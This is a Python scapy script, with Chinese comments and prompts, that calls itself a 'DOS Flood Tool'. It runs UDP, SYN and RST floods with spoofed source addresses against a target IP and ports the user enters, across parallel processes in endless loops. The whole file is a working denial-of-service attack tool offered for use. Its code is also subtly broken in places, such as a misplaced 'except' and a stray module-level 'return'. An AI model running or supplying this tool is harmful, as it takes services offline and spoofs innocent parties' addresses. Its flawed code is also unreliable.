from multiprocessing import Process
from scapy.all import *
import os
import sys
import random

# 生成随机IP地址
def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

# 生成随机端口号
def randInt():
    x = random.randint(1000, 9000)
    return x

def UDP_Flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending ...")
    
    for x in range(0, counter):
        s_port = randInt()
        payload = Raw(load="X" * 1024)  # 设置负载大小为1024字节

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        UDP_Packet = UDP()
        UDP_Packet.sport = s_port
        UDP_Packet.dport = dstPort

        send(IP_Packet / UDP_Packet / payload, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def TCP_Flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending ...")
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def RST_Flood(dstIP, srcIP, Port, counter):
    total = 0
    print("Packets are sending ...")
    for x in range(0, counter):
        IP_Packet = IP()
        IP_Packet.dst = dstIP
        IP_Packet.src = srcIP

        TCP_Packet = TCP()
        TCP_Packet.dport = Port
        TCP_Packet.flags = "R"

        # 发送ACK数据包
        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def validate_ip(ip):
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False        
        for part in parts:
            if not part.isdigit() or not 0 <= int(part) <= 255:
                return False
        return True
        except:
            return False
def validate_port(port):
    try:
        return 1 <= int(port) <= 65535
    except:
        return False
            
def info():
    os.system("clear")
    print("#############################")
    print("# Welcome to DOS Flood Tool #")
    print("#############################")
    while True:
        dstIP = input("\nTarget IP : ")
        if validate_ip(dstIP):
            break
        print("无效的IP地址！")
            
    while True:
        port_input = input("Target Ports (1-65535): ")
        try:
            normalPort = [int(p.strip()) for p in port_input.split(',')]
            if all(validate_port(p) for p in normalPort):
                break
            print("无效的端口号！")
        except:
            print("Invalid port format!")
                            
return dstIP, normalPort
                            
def info1():
    os.system("clear")
    print("#############################")
    print("# Welcome to DOS Flood Tool #")
    print("#############################")
    
    while True:
        dstIP = input("\nTarget IP : ")
        if validate_ip(dstIP):
            break
        print("无效的IP地址！")
        
    while True:
        port_input = input("Target Ports (1-65535): ")
        try:
            dstPort = [int(p.strip()) for p in port_input.split(',')]
            if all(validate_port(p) for p in dstPort):
                break
            print("无效的端口号！")
        except:
            print("Invalid port format!")

        while True:
            srcIP = input("\nSource IP : ")
            if validate_ip(srcIP):
                break
            print("无效的IP地址！")
            
    return dstIP, srcIP, dstPort

def udp_flood_attack(dstIP, normalPort, counter):
    j = 0
    while True:
        if j == len(normalPort):
            j = 0
        dstPort = normalPort[j]
        UDP_Flood(dstIP, dstPort, int(counter))
        j += 1

def tcp_flood_attack(dstIP, normalPort, counter):
    j = 0
    while True:
        if j == len(normalPort):
            j = 0
        dstPort = normalPort[j]
        TCP_Flood(dstIP, dstPort, int(counter))
        j += 1

def rst_flood_attack(dstIP, srcIP, dstPort, counter):
    j = 0
    while True:
        if j == len(dstPort):
            j = 0
        Port = dstPort[j]
        RST_Flood(dstIP, srcIP, Port, int(counter))
        j += 1

if __name__ == '__main__':
    attack_type = input("请选择攻击方式：\n1. UDP Flood\n2. TCP Flood\n3. RST Flood\n")

    while True:
        num = input("并行数: ")
        if num.isdigit() and int(num) > 0:
            num = int(num)
            break
        print("请输入正整数！")

    while True:
        counter = input("你需要发送多少包: ")
        if counter.isdigit() and int(counter) > 0:
            counter = int(counter)
            break
        print("请输入正整数！")

    process_list = []

    if attack_type == '1':
        dstIP, normalPort = info()
        for i in range(num):
            p = Process(target=udp_flood_attack, args=(dstIP, normalPort, counter))
            process_list.append(p)
    elif attack_type == '2':
        dstIP, normalPort = info()
        for i in range(num):
            p = Process(target=tcp_flood_attack, args=(dstIP, normalPort, counter))
            process_list.append(p)
    elif attack_type == '3':
        dstIP, srcIP, dstPort = info1()
        for i in range(num):
            p = Process(target=rst_flood_attack, args=(dstIP, srcIP, dstPort, counter))
            process_list.append(p)
    else:
        print("无效的攻击方式选择！")
        sys.exit()

    for p in process_list:
        p.start()
    
    for p in process_list:
        p.join()
